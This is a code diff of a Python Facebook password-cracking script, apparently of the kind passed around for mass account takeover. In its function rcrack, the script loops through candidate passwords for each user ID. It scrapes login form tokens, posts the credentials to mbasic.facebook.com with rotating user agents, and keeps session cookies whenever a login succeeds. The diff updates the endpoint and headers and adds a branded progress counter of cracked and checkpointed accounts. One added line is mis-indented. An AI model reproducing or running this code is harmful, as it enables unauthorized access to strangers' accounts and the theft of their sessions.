@@ -293,9 +293,11 @@ def rcrack(uid,pwx,tl):
     global proxy
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
+             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://p.facebook.com').text
+            sys.stdout.write('\r\033[1;92m[𝘾𝙔𝘽𝙀𝙍 𝘼𝙍𝘼𝙁𝘼𝙏]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -306,21 +308,26 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'m.alpha.facebook.com',
-	    'method': 'POST',
-	    'scheme': 'https',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-   	    'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
-	    'cache-control': 'max-age=0',
-	    'sec-ch-ua': '"Google Chrome";v="100", "Not)A;Brand";v="99", "Chromium";v="100"',
-  	    'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
- 	    'sec-fetch-dest': 'document',
- 	    'sec-fetch-mode': 'navigate',
- 	    'sec-fetch-site': 'none',
- 	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': pro}
-	    lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method':'GET',
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
